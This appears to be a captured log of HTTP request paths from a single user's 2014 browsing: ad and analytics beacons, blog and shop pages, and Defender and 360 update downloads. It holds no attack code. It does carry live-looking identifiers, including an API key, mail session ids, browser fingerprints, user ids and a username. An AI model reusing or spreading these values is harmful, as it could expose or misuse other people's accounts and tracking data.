+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000jWEg3mxZmGoeku4N000000.mLFW5HRYPH640A-Vu1Y3PjT4njTknHnvPHf3n16LrHcd0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&start=1417221869422&site_api_loaded=1417221869790&opt=1&v=7&found=1417221871526&loading=1417221871527&loaded=1417221871630&render_loaded=1417221871632&ad_count=2&pg_rect=0_0_1024_1024&img_rect=2079_692_300_210&showed=1417221871645&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1686406&actionid=8
+/js/jquery.cookie.js
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/p/close1.gif
+/images/btn_pub_nav.gif
+/images/top.png
+/jifen/images/xunzhang/jianzhang/blog2.png
+/pubfooter/images/gongshang_logos.gif
+/public/common/toolbar/images/f_name.png
+/public/common/toolbar/images/f_icon.png
+/public/common/toolbar/images/100x100.jpg
+/rabbit/tracking-ad/main.js?75eacd6
+/pubfooter/images/qq_icon.png
+/pubfooter/images/weibo_icon.png
+/pubfooter/images/mail_icon.png
+/pubfooter/images/phone_icon.png
+/skin/default/images/tit_bg.gif
+/nova_fp.htm?br=2&fp=3BD405A6244D04D1878B7B8AD3DE32F7&fp2=7DD371335C8923686BAF2B1441CC200F&ci=CAB12C5905297E40F611AC6D0F18286F:FG=1&bi=F5B42E62CCA313E12B218A22042B376D:FG=1&im=0&wf=1&ct=637&_=1417221864533
+/images/btn_attent.gif
+/images/btn_sendletter.gif
+/skin/default/images/blog-page-arr.png
+/skin/default/images/line_1.gif
+/skin/default/images/search_bg.gif
+/skin/default/images/ico_sear.gif
+/images/ico_Original.gif
+/images/ico_view.png
+/images/ico_comm.png
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/static/api/js/share.js?v=89860593.js?cdnversion=393671
+/7/C/6/1_stephenzhu.jpg
+/getRecommendList.html?jsonp=jsonp1417221862789&userId=fake_userId&size=10&his=2:6417453&client=blog_cf_enhance&query=LINUX下设置静态IP(实验环境：fedora9),fedora,linux,network,网卡,dns&cid=-2033113903484288206_20140807
+/MFYwVKADAgEAME0wSzBJMAkGBSsOAwIaBQAEFNS0O449AkkaZVBvlnMU3ehZRFLkBBTXm3zYIqAV992tX84pm1jDvEYAtQIQIQLvan8JPGdxldSAydA1JA==
+/wpad.dat
+/msg.popup.js
+/bin/logs.php
+/ms/wi/2.js
+/u/t/r?f=shendu&p=AQpn9SMAAFR5Fu5BkQCRBwRymtvmCHMQog==&d=bAt&t=WApqxSB6o2g=&y=mm_11803446_4530860_14854365&v=1417221870&m=xKv
+/u/w/dm?n=1
+/u/t/r?f=shendu&p=AQpn9TgAAFR5Fu5YSwCF5MKexd1BlJ1BmA==&d=X9t&t=WApqxSB6o2g=&y=mm_11803446_4530860_14842438&v=1417221870&m=tKv
+/MFYwVKADAgEAME0wSzBJMAkGBSsOAwIaBQAEFLnpsocChQP47KX7QuE+D0nHJCbiBBR/02Wnwt3su/AwCfNDOfoCrzMxMwIQZBvoIM4CCBPzLU0tldZ+Zw==
+/pv.aspx?id=24
+/public/common/tag-suggest-pop/css/style.css?dd7cc7c
+/common/ad.html?t=4&containerId=ad_cen&frmId=ad_frm_0
+/content/loginbox/style.css?r=1417221865174
+/common/ad.html?t=5&containerId=ad_bot&frmId=ad_frm_1
+/images/arrow_down.gif
+/common/ad.html?t=12&containerId=ad_commend&frmId=ad_frm_2
+/comm_ask/images/common_float_block.png
+/static/api/js/share/share_api.js?v=226108fe.js
+/static/api/js/view/share_view.js?v=3ae6026d.js
+/ms/wi/_2.png
+/search_product.htm?tbpm=1&q=navigare�콢��&type=p&style=&cat=all&vmarket=
+/ms/14b27/978dda4c5.swf
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000jWEg3mxZmGoeku4N000000.mLFW5HRYPH640A-Vu1Y3PjT4njTknHnvPHf3n16LrHcd0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=1&attach=0&time=1417221872777
+/ms/14b27/978dd1205.swf
+/static/api/js/base/tangram.js?v=37768233.js
+/static/api/js/share/api_base.js
+/search_product.htm?tbpm=2&q=navigare�콢��&type=p&style=&cat=all&vmarket=
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/platform
+/ggmm/csdn_ggmm.js
+/static/api/js/view/view_base.js
+/search_product.htm?tbpm=3&q=navigare�콢��&type=p&style=&cat=all&vmarket=
+/skin/default/images/blog-dot-red3.gif
+/z/IbCSBMF4EZoVgCwAY4DICaBlAChSCA2EAUwXGmICYBmAdgoRFoIE5aWAOFhaAY2IBmrDqgC2AewBGASwA20gF7FIA4LIDOxVAFdgkCQrmzgAUkoAxOADokZpAAoA7tIB24cY/V2XAFzsEraBNqACE7Rw8CBABKO2AAB3jZYkdiSQBraT8LODoragI7e3SACx9RWTMAYTt5dOI7AHNiXnTxWMokXhKAJ3FRBotqFhsrSmh6K3o7dWBVHukzSzyC1HVeHuJiFxgCJCQADw491HB4nphT4gA3aX5IcGJ1dJ9xeNQAfR8YHlpKceOcCQHGgQAAA=
+/proxy.html?X-ACL-TOKEN=tag_suggest_kdfjkqwuiplkajmncbsb_token&contentId=tagsCallback1417221865143
+/information/progress
+/v.gif?pid=307&type=3071&sc=1583,4719,1600,860&desturl=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&apitype=1&linkid=i329aymyzjg&velo_load=229&velo_cssload=2&velo_jsLoad=229&cite_uid=0&cite_type=1&cite_mini=0
+/ms/wi/2.png
+/static/api/css/share_style0_16.css?v=f4b44e79.css
+/s?type=1&r=15&cus=458_589089_6334273_29506038&impid=fDHK7ODlVoL=&tid=&finfo=DAABCAABAAAAVAgAAgAAABsEAAM/U2l1F0rLYgAIAAIAAAADCgADR1t+/MtKW5UIAAQAAABHBgAGOPUIAAgAFNRVAA&mv_ref=http://www.7y7.com/shuma/28/126028.html&price=AQpn9SwAAFR5Fu1XmAB9TiuN1JaJbIBlSg==
+/static/api/js/component/partners.js?v=0923e848.js
+/javascript/sm.min.js
+/js/jquery-1.4.2.min.js
+/query.htm?smApp=tmallsearch&smPolicy=tmallsearch-product-anti_Spider-html-checklogin&smCharset=GBK&smTag=MjE4Ljc1LjEyMy4xNzE=&smReturn=http://list.tmall.com/search_product.htm?tbpm=3&q=navigare%C6%EC%BD%A2%B5%EA&type=p&style=&cat=all&vmarket=&smSign=w/navLAlRp2jkpEQ//1J3Q==
+/main/s?user=csdn|blog|banner2&db=csdnim&border=0&local=yes&js=ie
+/ui?src=1000&k=%E9%9B%B7%E5%8F%AF%E5%84%BF%E5%8D%8A%E8%A3%B8%E5%BA%8A%E4%B8%8A%E6%80%A7%E6%84%9F%E5%9B%BE%E7%89%87&iurl[]=http://pic.7y7.com/201411/2014112441787453.jpg&qid=uwrp0f1417221869792&tu=1686406&width=300&height=210&opt=1&v=7&cached=0&pic=32&dri=3&callback=bd__cbs__k8hlqe
+/js/m.js
+/index.php?tn=site5566
+/adx.php?c=cz1jMzRmZGI0YTc0NzFlNmFlAHQ9MTQxNzIyMTg3MwBzZT01AGJ1PTQAcHJpY2U9VkhrVzhRQUlZQ2w3akVwZ1c1SUE4a3JfdFh5VzBuenVEUjRrRVEAY2htZD0xAGJkaWQ9AGNwcm9pZD0Adj0xAGk9Nzk3NDhlMTg
+/wh/o.htm?ltr=http://blog.csdn.net/stephenzhu/article/details/6417453
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa60002ehTgw2vYOjtwu4N000000.mLFW5HfzP1Dk0A-Vu1Y4nj03n1D1nHT1nHTYrjn4nW030Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&start=1417221869422&site_api_loaded=1417221869790&opt=1&v=7&found=1417221873410&loading=1417221873411&loaded=1417221873536&render_loaded=1417221873537&ad_count=3&pg_rect=0_0_1024_1024&img_rect=2079_992_0_210&showed=1417221873549&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1686406&actionid=8
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa60002ehTgw2vYOjtwu4N000000.mLFW5HfzP1Dk0A-Vu1Y4nj03n1D1nHT1nHTYrjn4nW030Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=4&attach=0&time=1417221873549
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/usr/uploads/201411/20141125161137_92235.flv
+/usr/uploads/201411/20141125141149_57133.flv
+/?from=sm&redirect_url=http://sec.taobao.com/query.htm?action=QueryAction&event_submit_do_login=ok&smApp=tmallsearch&smPolicy=tmallsearch-product-anti_Spider-html-checklogin&smCharset=GBK&smTag=MjE4Ljc1LjEyMy4xNzE%3D&smReturn=http%3A%2F%2Flist.tmall.com%2Fsearch_product.htm%3Ftbpm%3D3%26q%3Dnavigare%25C6%25EC%25BD%25A2%25B5%25EA%26type%3Dp%26style%3D%26cat%3Dall%26vmarket%3D&smSign=w%2FnavLAlRp2jkpEQ%2F%2F1J3Q%3D%3D
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/Login/userpage
+/public/common/tag-suggest-pop/images/close.png
+/fp.htm?br=2&fp=3BD405A6244D04D1878B7B8AD3DE32F7&fp2=7DD371335C8923686BAF2B1441CC200F&ci=CAB12C5905297E40F611AC6D0F18286F:FG=1&bi=F5B42E62CCA313E12B218A22042B376D:FG=1&im=0&wf=1&ct=527&_=1417221866590
+/su?wd=&json=1&p=3&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024&req=2&cb=jQuery110207629286674782634_1417221875217&_=1417221875218
+/platform
+/download/14705/
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.127.70
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.235.228
+/??p/header/header-min.css,p/mall/header/header-thin-v2.css?t=20100701.css
+/dev/api/?tn=playlist&special=flash&prepend=&format=json&id=public_xinqing_shanggan&callback=packFmLoadSongs&_=1417221875435
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.235.196
+/s/aplus_v2.js
+/s/fdc/??spm.js,spmact.js?v=141029
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa60002ehTgw2vYOjtwu4N000000.mLFW5HfzP1Dk0A-Vu1Y4nj03n1D1nHT1nHTYrjn4nW030Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=1&attach=0&time=1417221874416
+/2.gif?logtype=1&title=%u767B%u5F55 - %u5929%u732Btmall.com %u2014%u4E0A%u5929%u732B%uFF0C%u5C31%u8D2D%u4E86&pre=&cache=6f40ac9&scr=1440x900&isbeta=4&spm-cnt=3704.3033477.0.0.PN3tYb&category=&uidaplus=&aplus&yunid=
+/tps/i2/T1CCRNXmRFXXXXXXXX.png
+/tps/i2/T1G5O4XntaXXXXXXXX-81-81.png
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/app.gif?&cna=8gQADYwUN1kCAdpLe6t8nDyl
+/Login
+/tps/i3/TB1Xkl2GVXXXXauXFXXBf9A4FXX-435-276.jpg
+/v.gif?pid=201&pj=www&fm=behs&tab=tj_trnews&query=&un=&path=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&wd=&rsv_sid=10159_1459_9992_10194_9476_10121_10209_10017_10179_9498_10051_10218_10095_10008_10236_10256_9978_9023&t=1417221895309
+/tps/i1/T1O.q5XdVqXXXXXXXX-70-20.png
+/Login/self_information
+/
+/tps/i3/T1LkCRXaJfXXXXXXXX-145-239.png
+/data/music/fmlink?songIds=436855,1663384,433275,2117460,2078678,233323,7328035,344452,1077385,1070001&callback=packFmLoadSongsMore&_=1417221876090
+/resource/js/usermonitor.js?v=1.1
+/resource/js/jquery-1.8.3.min.js
+/iphone/img/loading_3.gif
+/static/widget/common/module_static_include/module_static_include_c0958689.css
+/static/home/focustop/focustop/focustop_aaa72a3e.css
+/static/widget/common/base_js_include/base_js_include_07d218e7.js
+/search/error.html
+/v.gif?mod=superplus:skeleton&submod=skeleton&utype=&superver=superplus&portrait=66b267726c31323331323341321830&glogid=3298968492&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xa6d6adb9000703e7&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.7232918862719089&m=superplus:skeleton_modShow&logactid=1100000000&showTab=3&opType=refresh
+/static/home/focustop/focustop/focustop_8f20f7b2.js
+/hunter/alog/alog.min.js
+/static/widget/common/module_static_include/module_static_include_94bb35c0.js
+/static/widget/common/framework_static_include/framework_static_include_7256f561.js
+/static/channel/ui/html/bdhx.html
+/nocache/mp/b.jpg?cmd=3&0.1886021406389773
+/Login/self_information
+/shm/msg_new.php?1=1&jsoncallback=_message_callback
+/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538
+/ui?src=1000&k=%E6%87%92%E4%BA%BA%E5%90%83%E4%BB%80%E4%B9%88%E8%83%BD%E5%BF%AB%E9%80%9F%E7%87%83%E8%84%82%20&iurl[]=http://pic.7y7.com/201411/2014112441864109.jpg&qid=uwrp0f1417221869792&tu=1686406&width=300&height=210&opt=1&v=7&cached=0&pic=32&dri=4&callback=bd__cbs__fsbutj
+/h.js?e9e114d958ea263de46e080563e254c4
+/c.gif?t=5&p=1&0.38002176489681005
+/www/images/popup/pic_close.gif
+/shm/count_new.php?id=2806&t=1
+/adx.php?c=cz05ODQ0NmFhM2NlYzJiNDYxAHQ9MTQxNzIyMTg3NQBzZT01AGJ1PTQAcHJpY2U9VkhrVzh3QUlSb1I3akVwZ1c1SUE4a0VTMDZHa2loVjEwQTF3UFEAY2htZD0xAGJkaWQ9AGNwcm9pZD0Adj0xAGk9ZjhjZjIyMGM
+/hunter/alog/monkey.min.js
+/resource/js/hx_finance_local.js
+/public03/imageplus/v2/dock/close.png
+/jquery/1.7.0/jquery.js
+/page/zhuanti/baidu/img/ssqlogo.gif
+/page/zhuanti/baidu/img/dltlogo.gif
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000AAYs_lWpbimtku4N000000.mLFW5HfYn1c30A-Vu1Y3PWDdnjcdPW64n10dnWcYrHTk0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&start=1417221869422&site_api_loaded=1417221869790&opt=1&v=7&found=1417221875405&loading=1417221875406&loaded=1417221875540&render_loaded=1417221875541&ad_count=4&pg_rect=0_0_1024_1024&img_rect=2079_992_0_210&showed=1417221875554&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1686406&actionid=8
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=1081807246&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000AAYs_lWpbimtku4N000000.mLFW5HfYn1c30A-Vu1Y3PWDdnjcdPW64n10dnWcYrHTk0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=4&attach=0&time=1417221875554
+/n?tn=json&cmd=1&class=civilnews&rn=20&datano=7&x=_showScrollNews
+/resource/js/news_zp_console.js
+/v.gif?pid=107&s=1600&tn=indsa&show=ftipbar_show&r=1417221896124
+/finance/index_defau.png
+/passApi/js/uni_login_wrapper.js?cdnversion=1417221896130
+/n?m=rddata&v=index_data&callback=bdNewsJsonCallBack&ra=0.24865774111822248
+/Login/self_information
+/z/resource/r/image/2014-11-28/fc4cbb19e4fdd2a01c9bf2acb87f02b5.jpg
+/z/resource/r/image/2014-11-29/0f69c5b2e5d75658c07d1789f78c9a02.jpg
+/z/resource/r/image/2014-11-29/e25eff358c65c9e8e27308639246d3bb.jpg
+/hunter/alog/element.min.js
+/z/resource/r/image/2014-11-29/36fab0623a9c3ff90de66a6cc31768a8.jpg
+/v.gif?pid=307&type=3071&sc=1024,3944,1440,873&desturl=&apitype=1&linkid=i329b4lqy16&velo_load=1255&velo_cssload=57&velo_jsLoad=1255&cite_uid=11080&cite_type=1&cite_mini=0
+/n?m=rddata&v=index_data&type=house&fr=index&rn2=5&callback=bdNewsJsonCallBack_1&ra=0.7698202808387578
+/news/q=100/sign=8a1ab78081025aafd5327acbcbedab8d/6f061d950a7b020820fdcea161d9f2d3572cc8be.jpg
+/z/resource/r/image/2014-11-29/fd2eabde6122c25bc13eb8cc951070ca.jpg
+/u.gif?ts=59&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&cmd=open
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/z/resource/r/image/2014-11-29/4c99fae148f6d96c739b6e11752d6076.jpg
+/zqmf/lecai.html
+/Upload/2014-11-14/280.188.jpg
+/webIM/message_pop.css
+/news/q=100/sign=16c487666e224f4a5199771339f69044/64380cd7912397dd057b69445a82b2b7d0a28774.jpg
+/page/zhuanti/baidu/img/lottery_bg.gif
+/quote?s2=000001.sh,399001.sz,399300.sz,N225.jp,TWII.tw,STI.sg,FTSE.uk,DAX.de,DJI.us,IXIC.us,SPI.us,CRUDE.nme,GOLD.nme,COPPER.lme,SLIVER.nme,SOYBEAN.cbt,CORN.usb,WHEAT.cbt,HSI001.hk,CCI001.hk,CEI001.hk
+/quotenew?s2=CNYBA.fx,HKCNBA.fx,ERCNBA.fx,UKCNBA.fx,USDJPY.fx,EURUSD.fx,GBPUSD.fx,?31496.262
+/u.gif?ts=hw&t=event&sid=i329bpkv5s6&mid=66&cmd=o
+/css/lecai/hhb.min.css
+/js/lecai/jquery.scroll.min.js
+/z/resource/r/image/2014-11-29/dba157cb39651b7dd8f8221aad9a70b8.jpg
+/z/resource/r/image/2014-11-29/acb7e1731e9d57fa7f22de9daae260eb.jpg
+/poll?r=0.22881011049104782&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.4934300987430186
+/it/u=http://images.qianlong.com/mmsource/images/2014/11/28/cfbm2014112801.jpg&fm=30
+/static/api/js/trans/logger.js?v=4e448e64.js
+/ga.js
+/news/q=100/sign=4e4a04796863f6241a5d3d03b745eb32/adaf2edda3cc7cd93145bb993a01213fb80e9102.jpg
+/images/zqmflogo.gif
+/cgi-bin/getinvestigate?sid=lpQyPHJkRu_WYUcT
+/ting/pic/item/738b4710b912c8fc6561e2ecfe039245d6882104.jpg
+/v.gif?pid=307&type=3071&sign=&desturl=http%3A%2F%2Fwww.baidu.com%2Fs%3Fie%3Dutf-8%26f%3D8%26rsv_bp%3D1%26rsv_idx%3D1%26tn%3Dbaidu%26wd%3Ddeepin%2520linux%2520%25E8%25AE%25BE%25E7%25BD%25AE%25E9%259D%2599%25E6%2580%2581ip%26rsv_pq%3Da2f02b8800068a63%26rsv_t%3D483fpTubvX34op21p1YM%252B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A%26rsv_enter%3D1%26inputT%3D8441%26rsv_sug3%3D54%26rsv_sug4%3D2801%26rsv_sug1%3D21%26rsv_sug2%3D0&linkid=i329b4j6upz&apitype=1
+/news/q=100/sign=6586c5993a01213fc9334adc64e636f8/18d8bc3eb13533fa6a1d626eabd3fd1f40345bc3.jpg
+/analytics.js
+/v.gif?pid=304&ref=radio&source=pcwidget-newindex&username=grl123123A2&page=baidu_home&expoitem=pcwidget&type=exposure
+/r/__utm.gif?utmwv=5.6.1&utms=1&utmn=52401640&utmhn=lecai.huanhuba.com&utmcs=UTF-8&utmsr=1920x1080&utmvp=982x60&utmsc=24-bit&utmul=zh-cn&utmje=1&utmfl=15.0 r0&utmhid=2013814913&utmr=http://baidu.lecai.com/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538&utmp=/zqmf/lecai.html&utmht=1417221896790&utmac=UA-31783028-1&utmcc=__utma=147400494.2001882507.1416985390.1417057213.1417221897.4;+__utmz=147400494.1417221897.4.4.utmcsr=baidu.lecai.com|utmccn=(referral)|utmcmd=referral|utmcct=/page/zhuanti/baidu/lottery_w984.shtml;&utmjid=1252553911&utmredir=1&utmu=qBAAAAAAAAAAAAAAAAAAAAAE~
+/eye.php?t=00000000000000000000000000000000w6000K3000jpiL8oa6000AAYs_lWpbimtku4N000000.mLFW5HfYn1c30A-Vu1Y3PWDdnjcdPW64n10dnWcYrHTk0Anq0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPW6vPj0vFHcvnf0&actionid=1&attach=0&time=1417221876420
+/stock/chart/index/index_1_000001.png?31496.762
+/stock/chart/index/index_1_399001.png?31496.763
+/stock/chart/index/index_1_399300.png?31496.763
+/stock/chart/hki/90001.png?31496.767
+/stock/chart/hki/90006.png?31496.767
+/stock/chart/hki/90007.png?31496.767
+/r/collect?v=1&_v=j31&a=2013814913&t=pageview&_s=1&dl=http://lecai.huanhuba.com/zqmf/lecai.html&dr=http://baidu.lecai.com/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538&ul=zh-cn&de=UTF-8&sd=24-bit&sr=1920x1080&vp=982x60&je=1&fl=15.0 r0&_utma=147400494.2001882507.1416985390.1417057213.1417221897.4&_utmz=147400494.1417221897.4.4.utmcsr=baidu.lecai.com|utmccn=(referral)|utmcmd=referral|utmcct=/page/zhuanti/baidu/lottery_w984.shtml&_utmht=1417221896904&_u=MACCAEQBI~&jid=4242943&cid=2001882507.1416985390&tid=UA-43910286-1&_r=1&z=1448647093
+/v.gif?mod=superplus:ps&submod=log&utype=&superver=superplus&portrait=66b267726c31323331323341321830&glogid=3298968492&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xa6d6adb9000703e7&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.03798866202123463&m=superplus:ps_categoryClick&logactid=1200100001&category=tjnews
+/cgi-bin/mail_spam?sid=lpQyPHJkRu_WYUcT&stat=getcopycontent&content=Summer&t=getcopycontent&action=copy_link&sid=lpQyPHJkRu_WYUcT
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/Login/inner_announce
+/sd/data_sufei/1.1.8/aplus/index.js
+/information/progress
+/webIM/pic_bg.gif
+/v.gif?pid=307&type=3071&sc=1583,2254,1600,860&desturl=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&apitype=1&linkid=i329b18dsas&velo_load=11&velo_cssload=3&velo_jsLoad=11&cite_uid=1536434&cite_type=1&cite_mini=0
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/information/rank
+/poll?r=0.8384404047392309&u=915910623&s=7&k=tslONqY336_XNnSx&t=0&i=30&r=0.9796374619472772
+/static/css/comm/rank.css
+/static/js/chart.min.js
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.7326819784939289
+/information/rank
+/u.gif?ts=29m&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.622&ci=1&pp=1415,365&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.03355656727217138
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.7326819784939289
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:455,y:365,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=2012224907&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/static/css/comm/rank.css
+/static/js/chart.min.js
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/cache/fpid/chromelib_1_1.js?_=1417221875219
+/information/rank
+/360ap/apcoredll_4de42d8c6d8e485cff421e4851e350ee_5.1.0.1050.cab
+/v3/markers/counts
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/information/progress
+/home/xman/data/treasuretips?_req_seqid=0xa6d6adb9000703e7&asyn=1&t=1417221881160&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024
+/home/msg/data/personalcontent?num=8&_req_seqid=0xa6d6adb9000703e7&asyn=1&t=1417221881160&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024
+/ps_fp.htm?pid=superplus&fp=182CB5CE5B0B8C9A41B26F48E5A27339&im=0&wf=1&br=2&qid=0xa6d6adb9000703e7&bi=6D16AB987010F84255BB3BD1834DFA96:FG=1
+/v.gif?mod=superplus:ps&submod=log&utype=&superver=superplus&portrait=66b267726c31323331323341321830&glogid=3298968492&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xa6d6adb9000703e7&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.39292399142868817&m=superplus:ps_categoryClick&logactid=1200100001&category=tj_ucent_mouseover
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.037517673801630735
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.037517673801630735
+/u.gif?ts=5ao&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.622&ci=2&pp=1415,365&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.5409694174304605
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:455,y:365,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=1936554323&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/platform
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/static/superplus/img/load_ext_spis_65c74648.png
+/data/2.4.0.8/brfversion.xml
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6292392662726343
